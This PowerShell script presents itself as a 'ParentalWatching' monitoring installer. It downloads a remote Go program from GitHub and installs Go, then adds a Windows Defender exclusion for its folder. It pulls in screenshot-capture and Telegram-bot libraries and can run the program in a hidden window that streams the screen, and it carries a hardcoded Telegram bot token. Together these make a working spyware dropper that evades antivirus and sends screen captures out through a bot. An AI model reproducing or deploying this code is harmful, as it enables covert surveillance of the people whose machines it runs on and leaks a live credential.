# install_and_run.ps1
# Downloads Go MSI, sets up environment, downloads or uses local monitoring.go, and runs it as a script
# USAGE: powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\install_and_run.ps1

param(
    [string]$BotToken = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE",
    [string]$Url = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/privatefile.go",
    [string]$DestFolder = "",
    [switch]$Auto,
    [switch]$RunHidden
)

# Config
$LogFile = Join-Path $env:TEMP "download_runner.log"
$GoVersion = "1.24.7"
$Arch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
$MsiName = "go$GoVersion.windows-$Arch.msi"
$MsiUrl = "https://go.dev/dl/$MsiName"
$GoInstallDir = "C:\Program Files\Go"
$GoBinPath = Join-Path $GoInstallDir "bin"
$GoFileName = "monitoring.go"
$DestFolder = if ($DestFolder) { $DestFolder } else { Join-Path $PSScriptRoot "ParentalWatching" }
$GoFilePath = Join-Path $DestFolder $GoFileName
$LogMaxSize = 10MB

# Helper: Log with rotation
function Log {
    param($Message)
    $Line = "$(Get-Date -Format o) - $Message"
    if (Test-Path $LogFile) {
        $LogSize = (Get-Item $LogFile).Length
        if ($LogSize -ge $LogMaxSize) {
            $BackupLog = "$LogFile.$(Get-Date -Format 'yyyyMMddHHmmss').bak"
            Rename-Item $LogFile $BackupLog -ErrorAction SilentlyContinue
        }
    }
    Add-Content -Path $LogFile -Value $Line -ErrorAction SilentlyContinue
    Write-Output $Line
}

# Helper: Test admin privileges
function Test-IsAdmin {
    try {
        ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {
        $false
    }
}

# Helper: Download file with verification
function Download-File($SourceUrl, $OutPath) {
    Log "Downloading $SourceUrl -> $OutPath"
    try {
        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $SourceUrl -OutFile $OutPath -UseBasicParsing -ErrorAction Stop
        if (Test-Path $OutPath) {
            $fileInfo = Get-Item $OutPath
            if ($fileInfo.Length -gt 0) {
                Log "Downloaded successfully, file size: $($fileInfo.Length) bytes"
                return $true
            } else {
                Log "Downloaded file is empty"
                return $false
            }
        } else {
            Log "Downloaded file not found at $OutPath"
            return $false
        }
    } catch {
        Log "Download failed: $_"
        return $false
    } finally {
        $ProgressPreference = 'Continue'
    }
}

# Helper: Add to system PATH
function Add-ToSystemPath($Path) {
    if (-not (Test-IsAdmin)) {
        Log "Cannot modify PATH: not admin"
        return $false
    }
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
        if ($CurrentPath -notlike "*$Path*") {
            Log "Adding $Path to system PATH"
            $NewPath = "$CurrentPath;$Path"
            [Environment]::SetEnvironmentVariable("Path", $NewPath, [System.EnvironmentVariableTarget]::Machine)
            Log "System PATH updated"
            return $true
        }
        Log "$Path already in PATH"
        return $true
    } catch {
        Log "Failed to update PATH: $_"
        return $false
    }
}

# Helper: Add Defender exclusion
function Add-DefenderExclusion($Path) {
    if (-not (Test-IsAdmin)) {
        Log "Cannot add Defender exclusion: not admin"
        return $false
    }
    try {
        Log "Adding Defender exclusion for $Path"
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        Log "Exclusion added"
        return $true
    } catch {
        Log "Failed to add Defender exclusion: $_"
        return $false
    }
}

# Helper: Install Go
function Install-Go {
    $MsiPath = Join-Path $DestFolder $MsiName
    if (Test-Path (Join-Path $GoInstallDir "bin\go.exe")) {
        Log "Go already installed at $GoInstallDir"
        return $true
    }
    if (-not (Test-IsAdmin)) {
        Log "Cannot install Go: not admin"
        Write-Host "Error: Run as Administrator to install Go."
        return $false
    }
    if (-not (Test-Path $DestFolder)) {
        Log "Destination folder $DestFolder does not exist. Creating it."
        New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null
    }
    if (-not (Test-Path $DestFolder)) {
        Log "Failed to create destination folder $DestFolder"
        Write-Host "Error: Could not create folder 'ParentalWatching'. Check permissions."
        return $false
    }
    Log "Downloading Go MSI $MsiUrl to $MsiPath"
    if (-not (Download-File $MsiUrl $MsiPath)) {
        Log "Go MSI download failed"
        return $false
    }
    Log "Running Go MSI installer with dialog"
    $Args = "/i `"$MsiPath`""
    try {
        $Proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $Args -Wait -PassThru -ErrorAction Stop
        if ($Proc.ExitCode -ne 0) {
            Log "Go MSI install failed: exit code $($Proc.ExitCode)"
            return $false
        }
        Log "Go installed successfully"
        Add-ToSystemPath $GoBinPath
        [Environment]::SetEnvironmentVariable("GOROOT", $GoInstallDir, [System.EnvironmentVariableTarget]::Machine)
        Log "GOROOT set to $GoInstallDir"
        return $true
    } catch {
        Log "Go MSI install error: $_"
        return $false
    }
}

# Helper: Run Go script
function Run-GoScript($GoFile) {
    if (-not (Test-Path $GoFile)) {
        Log "Go script $GoFile not found"
        return $false
    }
    Log "Running Go script: $GoFile"
    try {
        $Env:PATH = "$Env:PATH;$GoBinPath"
        $startArgs = @{
            FilePath = "go"
            ArgumentList = "run", $GoFile
            WorkingDirectory = $DestFolder
            PassThru = $true
            RedirectStandardError = Join-Path $DestFolder "go_run_error.log"
            ErrorAction = "Stop"
        }
        if ($RunHidden) {
            $startArgs['WindowStyle'] = "Hidden"
        } else {
            $startArgs['NoNewWindow'] = $true
        }
        $Proc = Start-Process @startArgs
        Log "Started go run process with PID: $($Proc.Id)"
        $maxAttempts = 10
        $attempt = 0
        $serverStarted = $false
        while ($attempt -lt $maxAttempts -and -not $serverStarted) {
            Start-Sleep -Seconds 2
            try {
                $Response = Invoke-WebRequest -Uri "http://localhost:5000/stream" -Method Get -TimeoutSec 5 -ErrorAction Stop
                if ($Response.StatusCode -eq 200) {
                    Log "MJPEG server started successfully on localhost:5000"
                    $serverStarted = $true
                }
            } catch {
                Log "Attempt $($attempt + 1): MJPEG server not yet started: $_"
            }
            $attempt++
        }
        if (-not $serverStarted) {
            $ErrorLog = Get-Content (Join-Path $DestFolder "go_run_error.log") -Raw -ErrorAction SilentlyContinue
            Log "MJPEG server failed to start after $maxAttempts attempts. Check $DestFolder\go_run_error.log and %TEMP%\monitor_bot.log. Error: $ErrorLog"
            return $false
        }
        return $true
    } catch {
        $ErrorLog = Get-Content (Join-Path $DestFolder "go_run_error.log") -Raw -ErrorAction SilentlyContinue
        Log "Failed to run Go script: $_. Error: $ErrorLog"
        return $false
    }
}

# Helper: Install Go dependencies
function Install-GoDependencies($GoFile) {
    if (-not (Test-Path $GoFile)) {
        Log "Go script $GoFile not found for dependency installation"
        return $false
    }
    Log "Installing Go dependencies for $GoFile in $DestFolder"
    try {
        $Env:PATH = "$Env:PATH;$GoBinPath"
        # Clean existing go.mod and go.sum to avoid conflicts
        $GoMod = Join-Path $DestFolder "go.mod"
        $GoSum = Join-Path $DestFolder "go.sum"
        if (Test-Path $GoMod) {
            Log "Removing existing go.mod to avoid conflicts"
            Remove-Item $GoMod -Force -ErrorAction SilentlyContinue
        }
        if (Test-Path $GoSum) {
            Log "Removing existing go.sum to avoid conflicts"
            Remove-Item $GoSum -Force -ErrorAction SilentlyContinue
        }
        Log "Initializing Go module"
        $Proc = Start-Process -FilePath "go" -ArgumentList "mod", "init", "monitoring" -WorkingDirectory $DestFolder -Wait -PassThru -NoNewWindow -RedirectStandardError (Join-Path $DestFolder "go_mod_error.log") -ErrorAction Stop
        if ($Proc.ExitCode -ne 0) {
            $ErrorLog = Get-Content (Join-Path $DestFolder "go_mod_error.log") -Raw -ErrorAction SilentlyContinue
            Log "Failed to initialize Go module: exit code $($Proc.ExitCode). Error: $ErrorLog"
            return $false
        }
        Log "Fetching dependencies"
        $Proc = Start-Process -FilePath "go" -ArgumentList "get", "-v", "github.com/kbinani/screenshot", "github.com/go-telegram-bot-api/telegram-bot-api/v5" -WorkingDirectory $DestFolder -Wait -PassThru -NoNewWindow -RedirectStandardError (Join-Path $DestFolder "go_get_error.log") -ErrorAction Stop
        if ($Proc.ExitCode -ne 0) {
            $ErrorLog = Get-Content (Join-Path $DestFolder "go_get_error.log") -Raw -ErrorAction SilentlyContinue
            Log "Failed to install dependencies: exit code $($Proc.ExitCode). Error: $ErrorLog"
            return $false
        }
        Log "Dependencies installed successfully"
        return $true
    } catch {
        Log "Dependency install error: $_"
        return $false
    }
}

# Main
Log "Script started. DestFolder: $DestFolder, Url: $Url"
if (-not (Test-Path $DestFolder)) {
    Log "Creating destination folder: $DestFolder"
    New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null
}
if (-not (Test-Path $DestFolder)) {
    Log "Failed to create destination folder: $DestFolder. Exiting."
    Write-Host "Error: Could not create folder 'ParentalWatching'. Check permissions."
    exit 1
}

# Check for local monitoring.go, otherwise download
if (Test-Path $GoFilePath) {
    Log "Local monitoring.go found at $GoFilePath. Using it."
} else {
    # Convert GitHub blob URL to raw
    if ($Url -match "github.com/.+/blob/(.+)$") {
        $Url = $Url -replace "https://github.com/", "https://raw.githubusercontent.com/" -replace "/blob/", "/"
        Log "Converted blob URL to raw: $Url"
    }
    # Download Go script
    if (-not (Download-File $Url $GoFilePath)) {
        Log "Failed to download Go script. Exiting."
        exit 1
    }
}

# Install Go
if (-not (Install-Go)) {
    Log "Go installation failed. Exiting."
    exit 1
}

# Add Defender exclusion
Add-DefenderExclusion $DestFolder

# Install dependencies and run
if (-not (Install-GoDependencies $GoFilePath)) {
    Log "Failed to install dependencies. Exiting."
    exit 1
}
if (-not (Run-GoScript $GoFilePath)) {
    Log "Failed to run Go script. Exiting."
    exit 1
}

Log "Script completed successfully."
Write-Host "The monitoring.go is now running. Access http://localhost:5000/stream in your browser for the live preview."
Write-Host "Check %TEMP%\monitor_bot.log for logs."
